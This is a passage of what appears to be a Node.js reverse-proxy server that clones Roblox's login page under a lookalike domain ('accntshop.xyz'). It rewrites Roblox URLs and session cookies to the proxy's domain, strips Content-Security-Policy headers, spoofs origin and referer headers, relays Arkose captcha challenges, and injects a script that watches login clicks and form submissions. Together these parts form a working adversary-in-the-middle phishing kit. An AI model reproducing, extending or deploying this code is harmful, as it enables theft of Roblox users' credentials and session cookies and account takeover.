        log('Ready to submit captcha solution');
    };
    
    // Helper to clear challenge state after successful login
    window.clearRblxChallengeState = function() {
        window.__rblxChallengeId = null;
        window.__rblxChallengeType = null;
        window.__rblxUserId = null;
        window.__rblxBrowserTrackerId = null;
        window.__rblxChallengeSolved = false;
        window.__rblxChallengeToken = null;
        window.__rblxCaptchaToken = null;
        sessionStorage.removeItem('__rblxChallengeId');
        sessionStorage.removeItem('__rblxChallengeType');
        sessionStorage.removeItem('__rblxUserId');
        sessionStorage.removeItem('__rblxBrowserTrackerId');
        sessionStorage.removeItem('__rblxChallengeSolved');
        sessionStorage.removeItem('__rblxChallengeToken');
        sessionStorage.removeItem('__rblxCaptchaToken');
        log('Challenge state cleared');
    };
    
    // Expose challenge state for debugging
    window.getRblxChallengeState = function() {
        return {
            challengeId: window.__rblxChallengeId,
            challengeType: window.__rblxChallengeType,
            userId: window.__rblxUserId,
            browserTrackerId: window.__rblxBrowserTrackerId,
            challengeSolved: window.__rblxChallengeSolved,
            challengeToken: window.__rblxChallengeToken,
            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
        };
    };

    // Save challenge state before page unload
    window.addEventListener('beforeunload', function() {
        if (window.__rblxChallengeId) {
            saveChallengeState();
            log('Saved challenge state before unload');
        }
    });
    
    // Intercept login button clicks to debug form submission
    document.addEventListener('click', function(e) {
        var target = e.target;
        // Check if clicked element is a login button or inside one
        while (target && target !== document.body) {
            if (target.tagName === 'BUTTON' || target.getAttribute('type') === 'submit') {
                var text = target.textContent || target.innerText || '';
                if (text.toLowerCase().includes('log in') || text.toLowerCase().includes('login')) {
                    log('Login button clicked!', {
                        solved: window.__rblxChallengeSolved, 
                        id: window.__rblxChallengeId,
                        userId: window.__rblxUserId,
                        captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
                    });
                }
            }
            target = target.parentElement;
        }
    }, true);
    
    // Intercept form submissions
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var action = form.action || '';
        if (action.includes('login') || form.id.includes('login')) {
            log('Login form submitted!', {
                action: action,
                solved: window.__rblxChallengeSolved,
                id: window.__rblxChallengeId,
                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
            });
        }
    }, true);
    
    // Monitor for challenge modal/iframe appearance
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            mutation.addedNodes.forEach(function(node) {
                if (node.nodeType === 1) { // Element node
                    // Check if it's an iframe (captcha iframe)
                    if (node.tagName === 'IFRAME') {
                        var src = node.src || '';
                        if (src.includes('arkose') || src.includes('funcaptcha') || src.includes('challenge')) {
                            log('Challenge iframe detected!', {src: src});
                        }
                    }
                    // Check for challenge modal
                    if (node.className && typeof node.className === 'string') {
                        if (node.className.includes('challenge') || node.className.includes('captcha')) {
                            log('Challenge element detected!', {className: node.className});
                        }
                    }
                }
            });
        });
    });
    
    // Start observing when DOM is ready
    if (document.body) {
        observer.observe(document.body, { childList: true, subtree: true });
    } else {
        document.addEventListener('DOMContentLoaded', function() {
            observer.observe(document.body, { childList: true, subtree: true });
        });
    }

    log('Proxy interceptor loaded with FULL ARKOSE support');
    log('Challenge state:', window.getRblxChallengeState());
})();
</script>`;
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    // Strip www. prefix for consistent URL rewriting
    const cleanHost = host.replace(/^www\./, '');
    let result = body;
    
    // Sort by target length descending so more specific domains match before shorter ones
    // e.g. challenge.roblox.com must match before a generic *.roblox.com pattern
    const entries = Object.entries(SUBDOMAIN_MAP).sort((a, b) => b[1].length - a[1].length);
    
    for (const [prefix, target] of entries) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${cleanHost}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${cleanHost}/${prefix}`);
    }
    
    // Rewrite main Roblox domains
    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${cleanHost}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${cleanHost}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${cleanHost}`);
    
    return result;
}

app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const ms = Date.now() - start;
        if (req.path !== '/www/e.png' && req.path !== '/pe' && !req.path.includes('arkose')) {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${ms}ms)`);
        }
    });
    next();
});

app.options('*', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    res.set({
        'access-control-allow-origin': origin,
        'access-control-allow-credentials': 'true',
        'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
        'access-control-allow-headers': [
            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
            'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
            ...CHALLENGE_HEADERS
        ].join(', '),
        'access-control-max-age': '86400',
    });
    res.sendStatus(200);
});

function createRobloxProxy(prefix, target) {
    const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
    const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com') || target.includes('rbxcdn.com');
    
    return createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        pathRewrite: { [`^/${prefix}`]: '' },
        proxyTimeout: 30000,
        timeout: 30000,
        agent,
        
        on: {
            proxyReq: (proxyReq, req) => {
                // For Arkose/rbxcdn, use their own origin/referer
                if (isArkose) {
                    const arkoseOrigin = target.replace(/\/+$/, '');
                    proxyReq.setHeader('origin', arkoseOrigin);
                    proxyReq.setHeader('referer', `${arkoseOrigin}/`);
                } else {
                    proxyReq.setHeader('origin', 'https://www.roblox.com');
                    proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                }
                
                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                proxyReq.setHeader('accept', req.headers['accept'] || 'application/json, text/plain, */*');
                proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
                proxyReq.setHeader('connection', 'keep-alive');
                
                if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
                if (req.headers['rbx-device-id']) proxyReq.setHeader('rbx-device-id', req.headers['rbx-device-id']);
                if (req.headers['rbxdeviceid']) proxyReq.setHeader('rbxdeviceid', req.headers['rbxdeviceid']);
                if (req.headers['x-bound-auth-token']) proxyReq.setHeader('x-bound-auth-token', req.headers['x-bound-auth-token']);
                
                for (const h of CHALLENGE_HEADERS) {
                    if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]);
                }
            },

            proxyRes: (proxyRes, req) => {
                if (proxyRes.headers['set-cookie']) {
                    const host = req.headers.host || 'localhost';
                    proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                }
                
                // CRITICAL: Strip CSP headers so browser doesn't block proxy URLs
                delete proxyRes.headers['content-security-policy'];
                delete proxyRes.headers['content-security-policy-report-only'];
                delete proxyRes.headers['x-content-security-policy'];
                
                const origin = req.headers['origin'] || `https://${req.headers.host}`;
                proxyRes.headers['access-control-allow-origin'] = origin;
                proxyRes.headers['access-control-allow-credentials'] = 'true';
                proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
                proxyRes.headers['access-control-allow-headers'] = [
                    'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
                    'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
                    ...CHALLENGE_HEADERS
                ].join(', ');
                proxyRes.headers['access-control-expose-headers'] = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
            },

            error: (err, req, res) => {
                if (req.path === '/www/e.png' || req.path === '/pe') {
                    res.status(204).end();
                    return;
                }
                console.error(`[${prefix}] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
                if (!res.headersSent) {
                    res.status(502).json({ error: 'Proxy error', code: err.code });
                }
            }
        }
    });
}

// Register all API proxies
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    app.use(`/${prefix}`, createRobloxProxy(prefix, target));
}

app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,

    pathRewrite: (path) => (path === '/' ? '/login' : path),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
            proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
            proxyReq.setHeader('connection', 'keep-alive');
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            // CRITICAL: Strip CSP headers so browser doesn't block proxy URLs
            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['content-security-policy-report-only'];
            delete proxyRes.headers['x-content-security-policy'];
            
            // CRITICAL: Rewrite cookies for initial page load
            const host = req.headers.host || 'accntshop.xyz';
            if (proxyRes.headers['set-cookie']) {
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies to domain: .${host.replace(/^www\./, '')}`);
            }

            // Set CORS headers
            const origin = req.headers['origin'] || `https://${host}`;
            res.setHeader('access-control-allow-origin', origin);
            res.setHeader('access-control-allow-credentials', 'true');
            res.setHeader('access-control-expose-headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));

            const ct = proxyRes.headers['content-type'] || '';

            if (ct.includes('text/html')) {
                let body = buffer.toString('utf8');
                body = rewriteUrls(body, host);
                const script = buildInjectedScript(host);
                body = body.replace('<head', `<head>${script}`);
                return body;
            }
            return buffer;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
            if (!res.headersSent) {
                res.status(502).send('Proxy error');
            }
        }
    }
}));

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
    console.log(`📋 rbxcdn.com domains mapped:`);
    console.log(`   - apis.rbxcdn.com → /apis-rbxcdn`);
    console.log(`   - captcha.rbxcdn.com → /captcha-rbxcdn`);
    console.log(`   - arkoselabs.roblox.com → /arkoselabs-rbxcdn`);
    console.log(`📋 Arkose Labs domains mapped:`);
    console.log(`   - roblox-api.arkoselabs.com → /arkose-api`);
    console.log(`   - client-api.arkoselabs.com → /arkose-client`);
    console.log(`   - cdn.arkoselabs.com → /arkose-cdn`);
    console.log(`   - funcaptcha.com → /arkose-funcaptcha`);
});
